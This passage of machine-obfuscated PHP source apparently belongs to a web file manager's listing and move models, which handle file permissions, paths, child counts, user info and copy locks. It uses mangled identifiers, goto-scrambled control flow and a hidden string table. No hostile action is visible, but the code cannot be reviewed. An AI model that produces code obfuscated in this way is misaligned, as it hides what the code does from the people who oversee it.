unset($cÅÃ–·ŠÄ[$fŒç«äÂ¡‚[174]][$fŒç«äÂ¡‚[173]]); } goto cæÛæ¼Ğ„„; cæÛæ¼Ğ„„: } unset($cÅÃ–·ŠÄ); goto b“­²ƒ†‹‚; b’«ÓÎçà: $fŒç«äÂ¡‚ =& $_SERVER[£¶ä½¶¢]; $fÉš‰×­Ş = array_to_keyvalue($FƒïŞõÖ¬, $fŒç«äÂ¡‚[43], $fŒç«äÂ¡‚[455]); $fÉš‰×­Ş = array_filter(array_unique($fÉš‰×­Ş)); goto Bâğ¬—ãÆª; b“­²ƒ†‹‚: } protected function _listAppendSourceInfo(&$AÎ±šˆ„ãš, $aé¹¥ÃšÀÖ) { goto e¬Ôõ¿ä¥; fÛƒê¦ø‚†: $F¼œ¼¹’œ = array_to_keyvalue($C¿Ì»ÃìÀÅ, $f‚Ë¿ƒ™‚Ä[401]); $e´„ŒÄ®ëÀ = array_to_keyvalue_group($cï¥Ş‡¦ö¥, $f‚Ë¿ƒ™‚Ä[86], $f‚Ë¿ƒ™‚Ä[427]); $D¯’šŠ™‘¤ = array_to_keyvalue($dõÏõ…÷ , $f‚Ë¿ƒ™‚Ä[86]); goto fÆƒÍ…òŸµ; b¶äàÑ©·–: return $AÎ±šˆ„ãš; goto d‹ô…›çöì; e¬Ôõ¿ä¥: $f‚Ë¿ƒ™‚Ä =& $_SERVER[£¶ä½¶¢]; if (!defined($f‚Ë¿ƒ™‚Ä[462])) { return; } $C¿Ì»ÃìÀÅ = Model($f‚Ë¿ƒ™‚Ä[463])->listData(); goto cÇ´ó¶ä°Ö; cÇ´ó¶ä°Ö: $cï¥Ş‡¦ö¥ = Model($f‚Ë¿ƒ™‚Ä[426])->listData(); $dõÏõ…÷  = Model($f‚Ë¿ƒ™‚Ä[416])->listData(); $ašÆ÷¥·Ş‰ = Model($f‚Ë¿ƒ™‚Ä[464])->listSimple(); goto fÛƒê¦ø‚†; fÆƒÍ…òŸµ: $BãÈªÕÃÓŸ = array_to_keyvalue_group($ašÆ÷¥·Ş‰, $f‚Ë¿ƒ™‚Ä[403]); foreach ($AÎ±šˆ„ãš as &$f‰ÈŸøˆö) { $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]] = array($f‚Ë¿ƒ™‚Ä[465] => 0, $f‚Ë¿ƒ™‚Ä[466] => 0, $f‚Ë¿ƒ™‚Ä[467] => 0); if (isset($D¯’šŠ™‘¤[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]])) { $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[468]] = 1; $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[469]] = $D¯’šŠ™‘¤[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]][$f‚Ë¿ƒ™‚Ä[38]]; } if (isset($e´„ŒÄ®ëÀ[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]])) { $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[470]] = array(); foreach ($e´„ŒÄ®ëÀ[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]] as $B°›åâ½Œ) { $D×³â„Í†° = $F¼œ¼¹’œ[$B°›åâ½Œ]; $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[470]][] = array($f‚Ë¿ƒ™‚Ä[471] => $D×³â„Í†°[$f‚Ë¿ƒ™‚Ä[401]], $f‚Ë¿ƒ™‚Ä[421] => $D×³â„Í†°[$f‚Ë¿ƒ™‚Ä[38]], $f‚Ë¿ƒ™‚Ä[472] => $D×³â„Í†°[$f‚Ë¿ƒ™‚Ä[473]]); } } if (isset($BãÈªÕÃÓŸ[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]])) { $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[474]] = array(); foreach ($BãÈªÕÃÓŸ[$f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[403]]] as $FÚÓ…¼Õ Õ) { $f‰ÈŸøˆö[$f‚Ë¿ƒ™‚Ä[95]][$f‚Ë¿ƒ™‚Ä[474]] = array($f‚Ë¿ƒ™‚Ä[475] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[476]], $f‚Ë¿ƒ™‚Ä[477] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[478]], $f‚Ë¿ƒ™‚Ä[479] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[403]], $f‚Ë¿ƒ™‚Ä[480] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[481]], $f‚Ë¿ƒ™‚Ä[482] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[483]], $f‚Ë¿ƒ™‚Ä[484] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[484]], $f‚Ë¿ƒ™‚Ä[485] => $FÚÓ…¼Õ Õ[$f‚Ë¿ƒ™‚Ä[485]]); } } } unset($f‰ÈŸøˆö); goto b¶äàÑ©·–; d‹ô…›çöì: } protected function _listAppendChildren(&$aìè”ÅíÉ, $bÕ¬ÛÜ›ª÷) { goto f°™ŞÉ±¦; f°™ŞÉ±¦: $BµÂ°çÆ =& $_SERVER[£¶ä½¶¢]; $a™êª¿£Ü = array(); $f›³ö‚ñë¹ = array($BµÂ°çÆ[213] => 0, $BµÂ°çÆ[214] => 0); goto C‰à„ªƒğÁ; cÓ£Á¥öõµ: $bÆŠŠÀ§ã = array(); foreach ($bĞ ±—‰¡ as $c¼ø¹À¸ê›) { $fæ³Å‰§¤ = $c¼ø¹À¸ê›[$BµÂ°çÆ[486]]; $A‡‹êò×ø— = $c¼ø¹À¸ê›[$BµÂ°çÆ[411]] == $BµÂ°çÆ[97] ? $BµÂ°çÆ[214] : $BµÂ°çÆ[213]; if (!isset($bÆŠŠÀ§ã[$fæ³Å‰§¤])) { $bÆŠŠÀ§ã[$fæ³Å‰§¤] = array($BµÂ°çÆ[213] => 0, $BµÂ°çÆ[214] => 0); } $bÆŠŠÀ§ã[$fæ³Å‰§¤][$A‡‹êò×ø—] += $c¼ø¹À¸ê›[$BµÂ°çÆ[488]]; } foreach ($aìè”ÅíÉ as &$BîÊˆÙ£Œï) { if (!$BîÊˆÙ£Œï[$BµÂ°çÆ[411]]) { continue; } $f³ËÛ“ƒÄÔ = is_array($bÆŠŠÀ§ã[$BîÊˆÙ£Œï[$BµÂ°çÆ[403]]]) ? $bÆŠŠÀ§ã[$BîÊˆÙ£Œï[$BµÂ°çÆ[403]]] : $f›³ö‚ñë¹; $BîÊˆÙ£Œï[$BµÂ°çÆ[214]] = $f³ËÛ“ƒÄÔ[$BµÂ°çÆ[214]]; $BîÊˆÙ£Œï[$BµÂ°çÆ[213]] = $f³ËÛ“ƒÄÔ[$BµÂ°çÆ[213]]; unset($BîÊˆÙ£Œï[$BµÂ°çÆ[413]]); } goto F…êâ¦‘ª¥; C‰à„ªƒğÁ: foreach ($aìè”ÅíÉ as &$BîÊˆÙ£Œï) { if (!$BîÊˆÙ£Œï[$BµÂ°çÆ[411]]) { continue; } $a™êª¿£Ü[] = $BîÊˆÙ£Œï[$BµÂ°çÆ[403]]; } unset($BîÊˆÙ£Œï); if (!$a™êª¿£Ü) { return; } goto dƒˆ«°‘ ¸; F…êâ¦‘ª¥: unset($BîÊˆÙ£Œï); goto b˜±‰ùƒÉ“; dƒˆ«°‘ ¸: $dÊ‘„èğÏã = array($BµÂ°çÆ[486] => array($BµÂ°çÆ[17], $a™êª¿£Ü)); $eŠ‰Òó¨Û = array($BµÂ°çÆ[486], $BµÂ°çÆ[411], $BµÂ°çÆ[487] => $BµÂ°çÆ[488]); $bĞ ±—‰¡ = $this->field($eŠ‰Òó¨Û)->where($dÊ‘„èğÏã)->group($BµÂ°çÆ[489])->select(); goto cÓ£Á¥öõµ; b˜±‰ùƒÉ“: } protected function _listAppendAuth(&$aáÌŸÁ‰¤) { goto Fé¶”ƒŞ‹È; F¹ÚÇ®ƒ™: $D”åïöÛ¨ = Model($D»ùõ®÷Ñ[490])->getSourceList($càŒÀÖíß, $cµÑ„Œ‹Û); foreach ($aáÌŸÁ‰¤ as $a½·™ãªà¦ => &$B¢Ì—‡½ç‚) { $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]] = $D”åïöÛ¨[$B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[403]]]; if (!$B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]] && $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[412]] == self::TYPE_GROUP) { $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]] = Action($D»ùõ®÷Ñ[491])->pathGroupAuthMake($B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[492]]); if (!$B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]] && !_get($GLOBALS, $D»ùõ®÷Ñ[493])) { $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[206]] = !1; $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[205]] = !1; } } if ($B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]]) { $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[206]] = AuthModel::authCheckEdit($B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]][$D»ùõ®÷Ñ[415]]); $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[205]] = AuthModel::authCheckView($B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[414]][$D»ùõ®÷Ñ[415]]); } $this->groupPathDisplay($B¢Ì—‡½ç‚); } unset($B¢Ì—‡½ç‚); goto dÉõéçæŞÍ; díÙë··ÍÛ: foreach ($aáÌŸÁ‰¤ as $B¢Ì—‡½ç‚) { if ($B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[412]] == self::TYPE_GROUP) { $càŒÀÖíß[] = $B¢Ì—‡½ç‚[$D»ùõ®÷Ñ[403]]; } } if (!$càŒÀÖíß) { return; } $cµÑ„Œ‹Û = array_to_keyvalue($aáÌŸÁ‰¤, $D»ùõ®÷Ñ[403]); goto F¹ÚÇ®ƒ™; Fé¶”ƒŞ‹È: $D»ùõ®÷Ñ =& $_SERVER[£¶ä½¶¢]; if (!defined($D»ùõ®÷Ñ[462])) { return; } $càŒÀÖíß = array(); goto díÙë··ÍÛ; dÉõéçæŞÍ: } public function groupPathDisplay(&$B ïÒÖ˜÷Œ) { goto d¾”ï’ó’ë; A×±Íí¤ëå: $DÔ´¬¬¯ì = $this->parentLevelArray($aÈÙÉ‰¨ÌŠ[$F—ŞŠ®İôŒ[495]]); $bõ¬Ë‹ä’ö = $F—ŞŠ®İôŒ[43]; foreach ($DÔ´¬¬¯ì as $E¯¨½È­°Ì) { $D´éïô©§ = Model($F—ŞŠ®İôŒ[494])->getInfo($E¯¨½È­°Ì); $bõ¬Ë‹ä’ö .= $D´éïô©§[$F—ŞŠ®İôŒ[95]][$F—ŞŠ®İôŒ[403]] . $F—ŞŠ®İôŒ[57]; } goto D¡Èå¦áÖ±; D¡Èå¦áÖ±: $B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[496]] = $aÈÙÉ‰¨ÌŠ[$F—ŞŠ®İôŒ[486]]; $B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[497]] = $aÈÙÉ‰¨ÌŠ[$F—ŞŠ®İôŒ[495]]; $B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[498]] = $aÈÙÉ‰¨ÌŠ[$F—ŞŠ®İôŒ[499]]; goto Cø¤›ï²¾¥; Cø¤›ï²¾¥: $B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[500]] = $bõ¬Ë‹ä’ö . $aÈÙÉ‰¨ÌŠ[$F—ŞŠ®İôŒ[95]][$F—ŞŠ®İôŒ[403]]; goto f¢“«•«¨»; d¾”ï’ó’ë: $F—ŞŠ®İôŒ =& $_SERVER[£¶ä½¶¢]; if ($B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[412]] != self::TYPE_GROUP) { return; } $aÈÙÉ‰¨ÌŠ = Model($F—ŞŠ®İôŒ[494])->getInfo($B ïÒÖ˜÷Œ[$F—ŞŠ®İôŒ[492]]); goto A×±Íí¤ëå; f¢“«•«¨»: } protected function _listAppendPath(&$Cá˜ó„ÓŠÇ) { goto B„å“Š’°¦; E—·›ùéº: $b‰´Ó·é¯ = array_unique($b‰´Ó·é¯); if (count($b‰´Ó·é¯) > 0) { $dƒ‘Ó›‰™Ÿ = array($aÛ–¤Æ¾[418] => array($aÛ–¤Æ¾[419], $b‰´Ó·é¯)); if (count($b‰´Ó·é¯) == 1) { $C°¤ìç×Š³ = $this->sourceInfo($b‰´Ó·é¯[0]); $f‡ä¹ßŞÆ = is_array($C°¤ìç×Š³) ? array($C°¤ìç×Š³) : !1; } else { $f‡ä¹ßŞÆ = $this->field($aÛ–¤Æ¾[501])->where($dƒ‘Ó›‰™Ÿ)->select(); } if (!$f‡ä¹ßŞÆ) { $f‡ä¹ßŞÆ = array(); } foreach ($f‡ä¹ßŞÆ as $fÚİ½Âò·) { $a©’èî¹©Ğ[$fÚİ½Âò·[$aÛ–¤Æ¾[403]]] = $fÚİ½Âò·[$aÛ–¤Æ¾[38]]; } } $d¯Ì¨±×ô³ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto B›¾°Ÿ©ìó; CÖ›ƒˆŠÅá: $B´§‘‡¥’Š = array(); foreach ($Cá˜ó„ÓŠÇ as &$dàÚñá¨ä) { $fÛñ÷è§Ë = $dàÚñá¨ä[$aÛ–¤Æ¾[411]] == $aÛ–¤Æ¾[97]; if ($fÛñ÷è§Ë) { $a©’èî¹©Ğ[$dàÚñá¨ä[$aÛ–¤Æ¾[403]]] = $dàÚñá¨ä[$aÛ–¤Æ¾[38]]; } if (isset($B´§‘‡¥’Š[$dàÚñá¨ä[$aÛ–¤Æ¾[495]]])) { continue; } $B´§‘‡¥’Š[$dàÚñá¨ä[$aÛ–¤Æ¾[495]]] = !0; $e â®†ä Ü = $this->parentLevelArray($dàÚñá¨ä[$aÛ–¤Æ¾[495]]); foreach ($e â®†ä Ü as $D¸„‚ËÀÅ => $F‚™ÀÀµ©) { if ($D¸„‚ËÀÅ != 0 && !isset($a©’èî¹©Ğ[$F‚™ÀÀµ©])) { $b‰´Ó·é¯[] = $F‚™ÀÀµ©; } } } unset($dàÚñá¨ä); goto E—·›ùéº; dÔ¯¿²ä£–: unset($dàÚñá¨ä); return $Cá˜ó„ÓŠÇ; goto Fí»ßöÄ; B„å“Š’°¦: $aÛ–¤Æ¾ =& $_SERVER[£¶ä½¶¢]; static $a©’èî¹©Ğ = array(); $b‰´Ó·é¯ = array(); goto CÖ›ƒˆŠÅá; B›¾°Ÿ©ìó: $D‹íëÄ‰Çœ = array(); $BÏ°¬óÑÇì = array(); foreach ($Cá˜ó„ÓŠÇ as &$dàÚñá¨ä) { goto Cè®ùÑà‹î; e¿­¾òé¹ó: $dàÚñá¨ä[$aÛ–¤Æ¾[503]] = str_replace($aÛ–¤Æ¾[504], $aÛ–¤Æ¾[18], $Fâóâõõ´); $eÀãÂ‘ªÉ = trim($dàÚñá¨ä[$aÛ–¤Æ¾[503]], $aÛ–¤Æ¾[18]); if ($dàÚñá¨ä[$aÛ–¤Æ¾[486]] == $aÛ–¤Æ¾[201] && $eÀãÂ‘ªÉ) { $dàÚñá¨ä[$aÛ–¤Æ¾[38]] = $eÀãÂ‘ªÉ; } goto b¨øÎ¾¿›á; b¨øÎ¾¿›á: if (intval($dàÚñá¨ä[$aÛ–¤Æ¾[412]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($dàÚñá¨ä, $e â®†ä Ü, $d¯Ì¨±×ô³); } goto dÛÀ‚•£ß¸; Cè®ùÑà‹î: $FËêÈô‰Æ® = $dàÚñá¨ä[$aÛ–¤Æ¾[495]]; if (isset($BÏ°¬óÑÇì[$FËêÈô‰Æ®])) { $Fâóâõõ´ = $D‹íëÄ‰Çœ[$FËêÈô‰Æ®]; } else { $e â®†ä Ü = $this->parentLevelArray($dàÚñá¨ä[$aÛ–¤Æ¾[495]]); $a»¯ØÕØî = $aÛ–¤Æ¾[502] . $dàÚñá¨ä[$aÛ–¤Æ¾[412]] . $aÛ–¤Æ¾[448] . $dàÚñá¨ä[$aÛ–¤Æ¾[492]]; if ($D‹íëÄ‰Çœ[$a»¯ØÕØî]) { $Fâóâõõ´ = $D‹íëÄ‰Çœ[$a»¯ØÕØî]; } else { $Fâóâõõ´ = $this->_listAppendPathRoot($dàÚñá¨ä, $e â®†ä Ü); $D‹íëÄ‰Çœ[$a»¯ØÕØî] = $Fâóâõõ´; } foreach ($e â®†ä Ü as $D¸„‚ËÀÅ => $F‚™ÀÀµ©) { if ($D¸„‚ËÀÅ == 0 && $Fâóâõõ´ && $dàÚñá¨ä[$aÛ–¤Æ¾[412]] == self::TYPE_GROUP) { continue; } if (isset($a©’èî¹©Ğ[$F‚™ÀÀµ©])) { $Fâóâõõ´ .= $a©’èî¹©Ğ[$F‚™ÀÀµ©] . $aÛ–¤Æ¾[18]; } } if ($e â®†ä Ü) { $Fâóâõõ´ .= $dàÚñá¨ä[$aÛ–¤Æ¾[38]]; } $D‹íëÄ‰Çœ[$FËêÈô‰Æ®] = $Fâóâõõ´; } if ($dàÚñá¨ä[$aÛ–¤Æ¾[411]]) { $Fâóâõõ´ .= $aÛ–¤Æ¾[18]; } goto e¿­¾òé¹ó; dÛÀ‚•£ß¸: } goto dÔ¯¿²ä£–; Fí»ßöÄ: } private function _listAppendPathRecycle(&$eø¡‡ĞÇœ—, $C«¤£ó‘Ñ×, $b«·Øï…µ) { goto D·º°¿¥ë; D·º°¿¥ë: $E†Ê•ªñó‘ =& $_SERVER[£¶ä½¶¢]; if (!in_array($b«·Øï…µ, $C«¤£ó‘Ñ×) && $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[403]] != $b«·Øï…µ) { return; } $EğİÒÆ†µ = explode($E†Ê•ªñó‘[18], trim($eø¡‡ĞÇœ—[$E†Ê•ªñó‘[503]], $E†Ê•ªñó‘[18])); goto e¹øÓ¤Û; e¹øÓ¤Û: $b‹ìÖğ·· = implode($E†Ê•ªñó‘[18], array_slice($EğİÒÆ†µ, 2)); $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[503]] = $E†Ê•ªñó‘[18] . LNG($E†Ê•ªñó‘[505]) . $E†Ê•ªñó‘[18] . ltrim($b‹ìÖğ··, $E†Ê•ªñó‘[18]); $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[495]] = $E†Ê•ªñó‘[506] . implode($E†Ê•ªñó‘[57], array_slice($C«¤£ó‘Ñ×, 1)) . $E†Ê•ªñó‘[57]; goto eòâ³Îë³; eòâ³Îë³: if ($eø¡‡ĞÇœ—[$E†Ê•ªñó‘[403]] == $b«·Øï…µ) { $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[495]] = $E†Ê•ªñó‘[506]; $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[486]] = $E†Ê•ªñó‘[201]; $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[38]] = LNG($E†Ê•ªñó‘[505]); } $eø¡‡ĞÇœ—[$E†Ê•ªñó‘[507]] = $E†Ê•ªñó‘[508]; goto Fè¡¹ ì; Fè¡¹ ì: } protected function _listAppendPathRoot(&$DÃÀ¸¹Ó, $d‚¥áÂ’çå) { $FÏÂšÏ·‰ =& $_SERVER[£¶ä½¶¢]; $C´ÅÏ‹ÉÚ = $FÏÂšÏ·‰[43]; if ($DÃÀ¸¹Ó[$FÏÂšÏ·‰[412]] == self::TYPE_USER) { if (defined($FÏÂšÏ·‰[462]) && $DÃÀ¸¹Ó[$FÏÂšÏ·‰[492]] == USER_ID) { $C´ÅÏ‹ÉÚ = LNG($FÏÂšÏ·‰[509]); if (!$d‚¥áÂ’çå) { $DÃÀ¸¹Ó[$FÏÂšÏ·‰[38]] = $C´ÅÏ‹ÉÚ; } } else { $b¾¡±Æ³¸ = Model($FÏÂšÏ·‰[510])->getInfoSimple($DÃÀ¸¹Ó[$FÏÂšÏ·‰[492]]); $C´ÅÏ‹ÉÚ = LNG($FÏÂšÏ·‰[511]) . $FÏÂšÏ·‰[170] . $b¾¡±Æ³¸[$FÏÂšÏ·‰[38]] . $FÏÂšÏ·‰[512]; } } else { if ($DÃÀ¸¹Ó[$FÏÂšÏ·‰[412]] == self::TYPE_GROUP) { $b¾¡±Æ³¸ = Model($FÏÂšÏ·‰[494])->getInfoSimple($DÃÀ¸¹Ó[$FÏÂšÏ·‰[492]]); $C´ÅÏ‹ÉÚ = $b¾¡±Æ³¸[$FÏÂšÏ·‰[38]]; } else { if ($DÃÀ¸¹Ó[$FÏÂšÏ·‰[412]] == self::TYPE_SYSTEM) { $C´ÅÏ‹ÉÚ = $FÏÂšÏ·‰[513]; } } } $C´ÅÏ‹ÉÚ = $C´ÅÏ‹ÉÚ ? $FÏÂšÏ·‰[18] . $C´ÅÏ‹ÉÚ . $FÏÂšÏ·‰[18] : $FÏÂšÏ·‰[18]; return $C´ÅÏ‹ÉÚ; } protected function _listAppendUser(&$fêè¶ÃºÏ…) { goto fª¥ŒÚø; E‘²¿ƒ‡†Ğ: unset($a”ˆÅËö); goto b¢¶•‚–‹İ; fª¥ŒÚø: $eÂï…é‘½² =& $_SERVER[£¶ä½¶¢]; $E›¡Ü¼‚Û = array_to_keyvalue($fêè¶ÃºÏ…, $eÂï…é‘½²[43], $eÂï…é‘½²[440]); $AĞ…¥¹ëëÈ = array_to_keyvalue($fêè¶ÃºÏ…, $eÂï…é‘½²[43], $eÂï…é‘½²[442]); goto dğ¹Â­ƒĞÊ; dğ¹Â­ƒĞÊ: $Dœ æÓ¼›‡ = array_merge($E›¡Ü¼‚Û, $AĞ…¥¹ëëÈ); $a´Ûòç›· = Model($eÂï…é‘½²[514])->userListInfo($Dœ æÓ¼›‡); foreach ($fêè¶ÃºÏ… as &$a”ˆÅËö) { $Fãæ¸»Ú‘Ô = $a”ˆÅËö[$eÂï…é‘½²[440]]; $a”ˆÅËö[$eÂï…é‘½²[440]] = $a´Ûòç›·[$Fãæ¸»Ú‘Ô] ? $a´Ûòç›·[$Fãæ¸»Ú‘Ô] : !1; $Fãæ¸»Ú‘Ô = $a”ˆÅËö[$eÂï…é‘½²[442]]; $a”ˆÅËö[$eÂï…é‘½²[442]] = $a´Ûòç›·[$Fãæ¸»Ú‘Ô] ? $a´Ûòç›·[$Fãæ¸»Ú‘Ô] : !1; if (isset($a”ˆÅËö[$eÂï…é‘½²[453]]) && $a”ˆÅËö[$eÂï…é‘½²[453]][$eÂï…é‘½²[515]]) { $B„¶İ¸°Ô = $GLOBALS[$eÂï…é‘½²[16]][$eÂï…é‘½²[98]][$eÂï…é‘½²[516]]; if ($a”ˆÅËö[$eÂï…é‘½²[453]][$eÂï…é‘½²[517]] <= time() - $B„¶İ¸°Ô) { $this->metaSet($a”ˆÅËö[$eÂï…é‘½²[403]], $eÂï…é‘½²[515], null); $this->metaSet($a”ˆÅËö[$eÂï…é‘½²[403]], $eÂï…é‘½²[517], null); unset($a”ˆÅËö[$eÂï…é‘½²[453]][$eÂï…é‘½²[515]]); continue; } $F‹‰ˆº‰’ï = $a”ˆÅËö[$eÂï…é‘½²[453]][$eÂï…é‘½²[515]]; $a”ˆÅËö[$eÂï…é‘½²[453]][$eÂï…é‘½²[518]] = Model($eÂï…é‘½²[514])->getInfoSimpleOuter($F‹‰ˆº‰’ï); } } goto E‘²¿ƒ‡†Ğ; b¢¶•‚–‹İ: } public function parentLevelArray($bİƒÜ‰‡½ø) { $aƒ—ëµ”Š© =& $_SERVER[£¶ä½¶¢]; $bİƒÜ‰‡½ø = explode($aƒ—ëµ”Š©[57], trim($bİƒÜ‰‡½ø, $aƒ—ëµ”Š©[57])); return array_remove_value($bİƒÜ‰‡½ø, $aƒ—ëµ”Š©[201]); } public function listAll($f–˜áÑÉ) { goto E©ø Â’æŸ; BÙîÍÜù: $this->_listAppendAuth($A¿„ÇÉöÎ¶); $this->_listAppendUser($A¿„ÇÉöÎ¶); $this->_listAppendPath($A¿„ÇÉöÎ¶); goto aÌà”¶Î…Ã; E©ø Â’æŸ: $c­Ê¼¬Ç Ü =& $_SERVER[£¶ä½¶¢]; $F¶ÚÊ ÈÚ = $this->sourceInfo($f–˜áÑÉ); $d¶ŠÔ³ÆÚ = array($c­Ê¼¬Ç Ü[519] => array($c­Ê¼¬Ç Ü[520], $F¶ÚÊ ÈÚ[$c­Ê¼¬Ç Ü[495]] . $f–˜áÑÉ . $c­Ê¼¬Ç Ü[521]), $c­Ê¼¬Ç Ü[522] => 0); goto b¯‹‰óê; b¯‹‰óê: $c‡Úá®¢Ëç = $c­Ê¼¬Ç Ü[523]; $AÑ¦™œÖè = "\114\x45\106\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\137\146\151\154\145\x20\x66\x69\x6c\145\x20\157\156\40\163\x6f\x75\x72\143\145\56\146\151\154\145\x49\104\40\75\40\x66\151\x6c\x65\x2e\x66\151\x6c\145\x49\104"; $A¿„ÇÉöÎ¶ = $this->alias($c­Ê¼¬Ç Ü[524])->field($c‡Úá®¢Ëç)->where($d¶ŠÔ³ÆÚ)->join($AÑ¦™œÖè)->select(); goto BÙîÍÜù; c‚­˜ù«: $bë„Ëç› = array(); foreach ($A¿„ÇÉöÎ¶ as $dñ›×Ò³Ëˆ => $DîÒÇÇ¼À) { goto eŞÑ‹«Šæ; fÈïµæ˜‡İ: for ($DİÈÖ“­ó = 0; $DİÈÖ“­ó < count($fÅ²ĞÄÒŠ); $DİÈÖ“­ó++) { $FğõÁˆ’ğ .= $A¿„ÇÉöÎ¶[$fÅ²ĞÄÒŠ[$DİÈÖ“­ó]][$c­Ê¼¬Ç Ü[38]] . $c­Ê¼¬Ç Ü[18]; } $FğõÁˆ’ğ .= $DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[38]]; if ($DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[411]]) { $FğõÁˆ’ğ .= $c­Ê¼¬Ç Ü[18]; } goto fìº‡•”åˆ; eì’„Ò±¥®: if (!$DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[411]]) { $FÓ©£Ù¿Ü“[$c­Ê¼¬Ç Ü[455]] = $DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[455]]; $FÓ©£Ù¿Ü“[$c­Ê¼¬Ç Ü[96]] = $DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[86]]; } $bë„Ëç›[] = $FÓ©£Ù¿Ü“; goto EìÒ¿·âèË; fìº‡•”åˆ: $FğõÁˆ’ğ = str_replace($c­Ê¼¬Ç Ü[504], $c­Ê¼¬Ç Ü[18], $FğõÁˆ’ğ); $FğõÁˆ’ğ = str_replace($c­Ê¼¬Ç Ü[504], $c­Ê¼¬Ç Ü[18], $FğõÁˆ’ğ); $FÓ©£Ù¿Ü“ = array($c­Ê¼¬Ç Ü[422] => str_replace($c­Ê¼¬Ç Ü[504], $c­Ê¼¬Ç Ü[18], $FğõÁˆ’ğ), $c­Ê¼¬Ç Ü[525] => intval($DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[411]]), $c­Ê¼¬Ç Ü[95] => $this->pathInfoFilter($DîÒÇÇ¼À)); goto eì’„Ò±¥®; eŞÑ‹«Šæ: $fÅ²ĞÄÒŠ = $this->parentLevelArray($DîÒÇÇ¼À[$c­Ê¼¬Ç Ü[495]]); array_shift($fÅ²ĞÄÒŠ); $FğõÁˆ’ğ = $a …¢«Ùó·; goto fÈïµæ˜‡İ; EìÒ¿·âèË: } return $bë„Ëç›; goto cò¼ñ…ß¹; aÌà”¶Î…Ã: $A¿„ÇÉöÎ¶ = array_to_keyvalue($A¿„ÇÉöÎ¶, $c­Ê¼¬Ç Ü[403]); $a …¢«Ùó· = "\x2f{$F¶ÚÊ ÈÚ[$c­Ê¼¬Ç Ü[38]]}\57"; $a …¢«Ùó· = $a …¢«Ùó· == $c­Ê¼¬Ç Ü[504] ? $c­Ê¼¬Ç Ü[18] : $a …¢«Ùó·; goto c‚­˜ù«; cò¼ñ…ß¹: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($B´ñêÁµ‚Ä) { goto A¢¯±§½¦ø; a÷—à½îùİ: $this->_lockEvent($B´ñêÁµ‚Ä, array($Dç¢¨áÌ¨ã[529], $Dç¢¨áÌ¨ã[530]), $FÜíŠµÙ„¢); $this->_lockCheckEnd($Dç¢¨áÌ¨ã[526], $B´ñêÁµ‚Ä); goto d¡‰‰•·ƒ; Aœàíš¼©±: $FÜíŠµÙ„¢ = 1; $this->_lockEvent($B´ñêÁµ‚Ä, array($Dç¢¨áÌ¨ã[527], $Dç¢¨áÌ¨ã[528]), $FÜíŠµÙ„¢); $this->_lockParent($B´ñêÁµ‚Ä, array($Dç¢¨áÌ¨ã[528]), $FÜíŠµÙ„¢); goto a÷—à½îùİ; A¢¯±§½¦ø: $Dç¢¨áÌ¨ã =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dç¢¨áÌ¨ã[526], $B´ñêÁµ‚Ä); goto Aœàíš¼©±; d¡‰‰•·ƒ: } public function lockCopyEnd($FÁ‡ˆô‹Öé) { 